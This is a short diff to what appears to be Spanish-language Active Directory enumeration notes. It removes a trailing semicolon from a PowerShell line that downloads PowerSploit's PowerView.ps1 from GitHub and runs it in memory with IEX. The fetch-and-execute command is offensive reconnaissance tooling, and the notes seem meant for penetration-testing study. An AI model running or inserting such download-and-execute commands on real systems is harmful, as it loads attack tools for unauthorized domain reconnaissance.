@@ -47,7 +47,7 @@ El término `'CN=Users,DC=domain1,DC=corp'` es un Nombre Distinguido (Distinguis
 
 ```powershell
 # Descargar el binario desde un repositorio 
-❯ IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1');
+❯ IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')
 ```
 
 ## Quick enumeration 
